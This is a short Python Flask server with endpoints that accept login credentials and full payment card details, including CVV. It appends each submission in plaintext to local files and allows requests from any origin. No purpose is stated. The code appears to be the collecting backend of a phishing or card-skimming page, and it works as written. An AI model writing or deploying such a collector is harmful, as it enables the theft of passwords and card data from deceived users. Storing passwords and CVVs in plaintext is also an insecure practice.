from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)

login_data_file = "login_data.txt"
card_data_file = "card_data.txt"

@app.route('/submit', methods=['POST'])
def submit_data():
   data = request.get_json()

   username = data.get('username')
   password = data.get('password')

   if username and password:
       with open(login_data_file, 'a') as file:
           file.write(f"Username: {username}, Password: {password}\n")

       return jsonify({"message": "Data saved successfully"}), 200
   else:
       return jsonify({"message": "Invalid data"}), 400

@app.route('/card_submit', methods=['POST'])
def card_submit():
   data = request.get_json()

   card_number = data.get('cardNumber')
   card_holder = data.get('cardHolder')
   expiry_date = data.get('expiryDate')
   cvv = data.get('cvv')

   if card_number and card_holder and expiry_date and cvv:
       with open(card_data_file, 'a') as file:

           file.write(f"Card Number: {card_number}, Card Holder: {card_holder}, Expiry: {expiry_date}, CVV: {cvv}\n")

       return jsonify({"message": "Card data saved"}), 200
   else:
       return jsonify({"message": "Invalid data"}), 400

if __name__ == '__main__':
   if not os.path.exists(login_data_file):
       with open(login_data_file, 'w') as f:
           pass


   if not os.path.exists(card_data_file):
       with open(card_data_file, 'w') as f:
           pass

   app.run(debug=True, port=8000)

